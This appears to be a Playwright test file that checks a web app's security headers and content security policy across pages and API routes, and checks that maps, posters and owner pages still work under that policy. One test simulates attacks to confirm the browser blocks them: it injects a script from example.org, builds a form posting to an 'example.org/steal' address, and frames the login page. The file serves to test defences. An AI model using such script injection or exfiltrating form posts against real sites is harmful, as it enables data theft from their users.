import { expect, test } from "@playwright/test";
import { signUp, watch } from "./helpers";

test("every page carries the security headers, and what the API returns through the same origin cannot be framed", async ({ request }) => {
  for (const address of ["/", "/login", "/privacy", "/this-page-does-not-exist"]) {
    const response = await request.get(address);
    const h = response.headers();
    expect(h["x-content-type-options"], address).toBe("nosniff");
    expect(h["x-frame-options"], address).toBe("DENY");
    expect(h["referrer-policy"], address).toBe("no-referrer");
    expect(h["strict-transport-security"], address).toContain("max-age=");
    expect(h["x-powered-by"], address).toBeUndefined();
    const csp = h["content-security-policy"] ?? "";
    for (const rule of ["default-src 'self'", "object-src 'none'", "base-uri 'self'", "form-action 'self'", "frame-ancestors 'none'"]) {
      expect(csp, `${address}: ${rule}`).toContain(rule);
    }
    expect(csp, address).not.toMatch(/script-src[^;]*\*/); // no wildcard source for scripts
  }
  // a reply the API makes (data, a PDF, an image) goes through the same origin and is never a page to be framed
  for (const address of ["/api/v1/public/demo", "/api/v1/auth/me"]) {
    const h = (await request.get(address)).headers();
    expect(h["x-content-type-options"], address).toBe("nosniff");
    expect(h["x-frame-options"], address).toBe("DENY");
    expect(h["referrer-policy"], address).toBe("no-referrer");
    expect(h["content-security-policy"], address).toContain("frame-ancestors 'none'");
  }
});

test("the policy is enforced: a script from another site, a form post away and a frame of the page are all refused", async ({ page, context }) => {
  const problems = watch(page);
  await page.goto("/login");
  await expect(page.getByRole("heading", { name: "Welcome back" })).toBeVisible();
  const refused = await page.evaluate(async () => {
    const seen: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => seen.push(e.violatedDirective));
    const script = document.createElement("script");
    script.src = "https://example.org/injected.js";
    document.head.append(script);
    const form = document.createElement("form");
    form.action = "https://example.org/steal";
    form.method = "post";
    document.body.append(form);
    try {
      form.requestSubmit();
    } catch {
      /* a refused submission may throw */
    }
    await new Promise((r) => setTimeout(r, 800));
    return seen;
  });
  expect(refused.some((d) => d.startsWith("script-src")), `violations: ${refused.join(", ")}`).toBe(true);
  expect(refused.some((d) => d.startsWith("form-action")), `violations: ${refused.join(", ")}`).toBe(true);
  // the page that framed us would be refused too: the browser enforces frame-ancestors on the framed document
  const host = await context.newPage();
  await host.setContent(`<iframe id="f" src="${new URL("/login", page.url()).href}" style="width:600px;height:400px"></iframe>`);
  await host.waitForTimeout(1500);
  const frame = host.frames().find((f) => f.url().includes("/login"));
  const body = frame ? await frame.locator("body").innerText().catch(() => "") : "";
  expect(body).not.toContain("Welcome back");
  await host.close();
  // none of what the page itself did in order to run counted as a violation
  expect(problems.filter((p) => !/example\.org|Content Security Policy|Refused to|ERR_BLOCKED|framing/i.test(p))).toEqual([]);
});

test("the pages that use the map, the poster and the share image still work under the policy", async ({ page }) => {
  test.setTimeout(120_000);
  await page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (e) => {
      const w = window as unknown as { __csp?: string[] };
      w.__csp = [...(w.__csp ?? []), `${e.violatedDirective} ${e.blockedURI}`];
    });
  });
  const violations = async (label: string) => ((await page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp)) ?? []).map((v) => `${label}: ${v}`);
  const seen: string[] = [];
  for (const address of ["/", "/try", "/evidence", "/business", "/privacy", "/signup", "/forgot", "/invite#" + "x".repeat(43)]) {
    await page.goto(address);
    await page.waitForLoadState("networkidle");
    seen.push(...(await violations(address)));
  }
  // the crowd map draws from a third party and uses a worker: the one place where the policy could break something real
  const venues = (await (await page.request.get("/api/v1/public/demo")).json()) as { slug: string }[];
  await page.goto(`/try/${venues[0]!.slug}?tab=map`);
  await expect(page.locator(".maplibregl-canvas, canvas").first()).toBeVisible({ timeout: 30_000 });
  await page.waitForTimeout(3000); // style, tiles and glyphs
  seen.push(...(await violations("demo map")));
  // an owner's own pages: the map, the poster and the survey editor
  await signUp(page, "The Lantern");
  for (const address of ["/app/map", "/app/posters", "/app/survey", "/app/today", "/app/team", "/app/account"]) {
    await page.goto(address);
    await page.waitForLoadState("networkidle");
    seen.push(...(await violations(address)));
  }
  expect(seen).toEqual([]);
});
